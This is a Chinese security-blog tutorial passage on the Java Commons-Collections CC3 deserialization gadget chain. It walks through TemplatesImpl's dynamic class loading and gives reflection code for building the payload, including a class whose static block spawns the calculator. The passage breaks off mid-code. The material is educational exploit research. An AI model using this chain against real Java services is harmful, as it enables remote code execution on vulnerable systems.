---
title: CC1打不通时的另外一条链CC3
url: https://www.secpulse.com/archives/196062.html
source: 安全脉搏
date: 2023-02-18
fetch_date: 2025-10-04T07:19:56.612666
---

# CC1打不通时的另外一条链CC3

[![](https://www.secpulse.com/wp-content/themes/secpulse2017/img/logo-header.png)](https://www.secpulse.com "安全脉搏")

* [首页](https://www.secpulse.com/)
* [分类阅读](https://www.secpulse.com/archives/category/category)

  #### 脉搏文库

  - [内网渗透](https://www.secpulse.com/archives/category/articles/intranet-penetration)
  - |
  - [代码审计](https://www.secpulse.com/archives/category/articles/code-audit)
  - |
  - [安全文献](https://www.secpulse.com/archives/category/articles/sec-doc)
  - |
  - [Web安全](https://www.secpulse.com/archives/category/articles/web)
  - |
  - [移动安全](https://www.secpulse.com/archives/category/articles/mobile-security)
  - |
  - [系统安全](https://www.secpulse.com/archives/category/articles/system)
  - |
  - [工控安全](https://www.secpulse.com/archives/category/articles/industrial-safety)
  - |
  - [CTF](https://www.secpulse.com/archives/category/exclusive/ctf-writeup)
  - |
  - [IOT安全](https://www.secpulse.com/archives/category/iot-security)
  - |

#### 安全建设

+ [业务安全](https://www.secpulse.com/archives/category/construction/businesssecurity)
+ |
+ [安全管理](https://www.secpulse.com/archives/category/construction/securityissue)
+ |
+ [数据分析](https://www.secpulse.com/archives/category/construction/bigdata)
+ |

#### 其他

+ [资讯](https://www.secpulse.com/archives/category/news)
+ |
+ [漏洞](https://www.secpulse.com/archives/category/vul)
+ |
+ [工具](https://www.secpulse.com/archives/category/tools)
+ |
+ [人物志](https://www.secpulse.com/archives/category/people)
+ |
+ [区块链安全](https://www.secpulse.com/archives/category/exclusive/block_chain_security)
+ |
+ [安全招聘](https://www.secpulse.com/archives/category/hiring)
+ |

- [安全问答](https://www.secpulse.com/newpage/question_list)
- [金币商城](https://www.secpulse.com/shop?donotcachepage=c010349fd98847cb9d6e07d3cbc19288)
- [安全招聘](https://www.secpulse.com/archives/category/hiring)
- [活动日程](https://www.secpulse.com/newpage/activity)
- [live课程](https://www.secpulse.com/live)
- [企业服务](https://duoyinsu.com/service.html)
- [插件社区](https://x.secpulse.com/)

小程序

![脉搏小程序](https://www.secpulse.com/wp-content/themes/secpulse2017/img/wxchat.jpg)
[登录](https://www.secpulse.com/user_login)
|
[注册](https://www.secpulse.com/user-register)

# CC1打不通时的另外一条链CC3

[Web安全](https://www.secpulse.com/archives/category/articles/web)

[蚁景网安实验室](https://www.secpulse.com/newpage/author?author_id=37244)
![]( https://www.secpulse.com/wp-content/themes/secpulse2017/img/renzheng2.png)

2023-02-17

12,136

在CC1和CC6中，我们最终弹计算器都是通过`Runtime.exec`进行调用，从CC3我们要介绍一种不通过Runtime来弹计算器的方法，也就是Java中常提到的动态类加载，动态类加载可以让我们通过一个路径来加载一个恶意类，如果这个恶意类在`静态代码块`或`构造代码块`中写入了恶意方法，那么我们就可以通过找一条链子来初始化这个类（一般在进行实例化时会对类进行初始化），从而达到代码块中的代码执行。

ClassLoader中的defineClass最终实现了类的动态加载（后面还有一些过程但已经是依靠c来实现的了），在ClassLoader中可以看到一堆defineClass，我们查找用法，看一下哪个defineClass在别处被调用了，而且权限最好是default或者public，方便我们利用，最终锁定下面这个：

```
protected final Class<?> defineClass(String name, byte[] b, int off, int len)
        throws ClassFormatError
```

这个defineClass被调用的点在`com.sun.org.apache.xalan.internal.xsltc.trax`中的`TemplatesImpl.TransletClassLoader`下，也是一个defineClass：

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-196062-1676619091.png "null")

这个defineClass又在当前类中被`defineTransletClasses`调用：

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-196062-1676619092.png "null")

`defineTransletClasses`同类下有三个被调用点，我们看一下哪个方法可以被我们利用：

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-196062-1676619093.png "null")

第一个返回`_class`：

```
private synchronized Class[] getTransletClasses() {
        try {
            if (_class == null) defineTransletClasses();
        }
        catch (TransformerConfigurationException e) {
            // Falls through
        }
        return _class;
    }
```

第二个返回了`_class`的下标：

```
public synchronized int getTransletIndex() {
        try {
            if (_class == null) defineTransletClasses();
        }
        catch (TransformerConfigurationException e) {
            // Falls through
        }
        return _transletIndex;
    }
```

第三个方法我们主要看newInstance这里，这个`_class[_transletIndex]`可控（通过上面找到的`defineTransletClasses`动态加载进来），如果我们让\_class为我们所构造的恶意类并让它newInstance，那么就可以执行恶意类中的静态/构造代码块中的代码，所以我们接着找这个方法的调用点：

```
private Translet getTransletInstance()
        throws TransformerConfigurationException {
        try {
            if (_name == null) return null;

            if (_class == null) defineTransletClasses();

            // The translet needs to keep a reference to all its auxiliary
            // class to prevent the GC from collecting them
            AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();
```

下一调用点还是在这个类中，我们找到newTransformer()这个方法：

```
public synchronized Transformer newTransformer()
        throws TransformerConfigurationException
    {
        TransformerImpl transformer;

        transformer = new TransformerImpl(getTransletInstance(), _outputProperties,
            _indentNumber, _tfactory);
```

我们来梳理一下到目前的调用链，很短也很方便：

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-196062-1676619095.png "null")

我们先将payload写出来：

```
TemplatesImpl templatesimpl = new TemplatesImpl();
        templatesimpl.newTransformer();
```

写完啦 下班！（开个玩笑）逻辑上来说这两行代码确实是完整的调用链，我们接下来要做的就是对类内部的各种属性进行赋值：

`newTransformer`内不需要进行赋值操作，跟进到`getTransletInstance`中 ，类内没有对\_name和\_class进行赋值，如果想要触发`defineTransletClasses()`我们就需要让\_name不为空，\_class为空，直接不给\_class赋值即可：

```
if (_name == null) return null;

if (_class == null) defineTransletClasses();
```

继续跟进到`defineTransletClasses`中 ，如果想要走到下面动态加载\_class，我们这里要注意对\_tfactory进行赋值，否则对一个空属性调用方法，会爆空指针异常：

```
return new TransletClassLoader(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap());
```

上一步之后我们在对\_class赋值这里可以看到是通过修改`_bytecodes`从而控制\_class的值：

```
for (int i = 0; i < classCount; i++) {
                _class[i] = loader.defineClass(_bytecodes[i]);
```

一共三个需要修改的值，TemplatesImpl类是可序列化的，所以我们可以直接通过反射修改这些值，看一下这几个值的类型:

```
private String _name = null;
private byte[][] _bytecodes = null;
private transient TransformerFactoryImpl _tfactory = null;
```

都是private属性，所以要用`setAccessible` 来修改访问权限，name是String类型，所以直接赋个字符串就行：

```
                Class tmp = templatesimpl.getClass();
        Field nameField = tmp.getDeclaredField("_name");
        nameField.setAccessible(true);
        nameField.set(templatesimpl,"y1");
```

再看`_bytecodes`，一个二维数组，但我们在给\_class赋值时defineClass接受的却是一个一维数组：

```
for (int i = 0; i < classCount; i++) {
                _class[i] = loader.defineClass(_bytecodes[i]);

Class defineClass(final byte[] b) {
            return defineClass(null, b, 0, b.length);
```

所以我们给`_bytecodes` 赋值时可以将defineClass接收的一维数组放进\_bytecodes这个二维数组中，这样在进行for循环遍历时就可以将这个一维数组遍历出来并传给defineClass，这个class需要我们在写好java源码后手动编译为class文件，最好把这个class文件复制到电脑上的别的地方再在这里使用（编译后的class文件一般在target下）：

```
Field bytecodesField = tmp.getDeclaredField("_bytecodes");
        bytecodesField.setAccessible(true);
        byte[] code = Files.readAllBytes(Paths.get("/Users/y1zh3e7/Desktop/Test.class"));
        byte[][] codes = {code};
        bytecodesField.set(templatesimpl,codes);
```

```
Test.class

public class Calc {
    static{
        try {
            Runtime.getRuntime().exec("open -na Calculator"); //这里是mac弹计算器的命令
        } catch (IOException e) {                             //win下还是calc
            throw new RuntimeException(e);
        }

    }
}
```

然后我们再来改\_tfactory的值：

这里要注意一下，被transient关键字修饰的属性是不参与序列化的，也就是说就算我们通过反射修改了它的值，反序列化后的二进制流这个属性的值也依旧是null，所以这里我们要用其他的方式赋值

```
private transient TransformerFactoryImpl _tfactory = null;
```

我们在readObject中发现有对这些属性进行赋值的操作，\_tfactory的值是一个TransformerFactoryImpl实例：

```
_name = (String)gf.get("_name", null);
   //以下几行代码对序列化流中的属性读取它们的值，如果读不到值那么将它的值设为默认值（第二个参数）
              _bytecodes = (byte[][])gf.get("_bytecodes", null);
        _class = (Class[])gf.get("_class", null);
        _transletIndex = gf.get("_transletIndex", -1);

        _outputProperties ...